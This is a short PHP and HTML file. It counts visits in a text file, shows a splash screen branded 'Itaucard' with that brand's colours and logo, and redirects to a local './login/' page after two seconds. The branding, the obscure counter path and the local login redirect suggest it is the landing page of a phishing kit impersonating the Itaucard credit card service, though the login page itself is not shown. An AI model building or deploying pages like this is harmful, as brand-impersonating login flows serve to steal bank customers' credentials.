<?php
$arquivo = "doct/ff/ad/contador.txt";

$read = fopen($arquivo, "r");
$visitas = fread($read, 1024);
fclose($read);

$visitas ++;

$write = fopen($arquivo, "w");
fwrite($write, $visitas);
fclose($write);
?>

<!DOCTYPE html>
<html>
<head>
	<title>Itaucard</title>
	<meta name="theme-color" content="#253a6d">
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
	<link rel="shortcut icon" href="imagens/ico.png" type="image/x-icon" />
	<script type="text/javascript" src="js/jquery.js"></script>
	<style type="text/css">
		*{
			padding: 0;
			margin:0;
		}
		html{
			float: left;
			width: 100%;
			height: 100%;
		}
		body{
			background: linear-gradient(#253a6d, #3f6075);
			background-size: cover;
			background-repeat: no-repeat;
			float: left;
			width: 100%;
			height: 100%;
		}
		img{
			float: left;
			width: 70%;
			margin-left: 15%;
			position: relative;
			margin-top:300px;
		}
	</style>
	<script type="text/javascript">
		$(document).ready(function() {
			setTimeout(function() {
				location.href = "./login/";
			}, 2000);
		});
	</script>
</head>
<body>
<img src="imagens/img_splash_logo.png">
</body>
</html>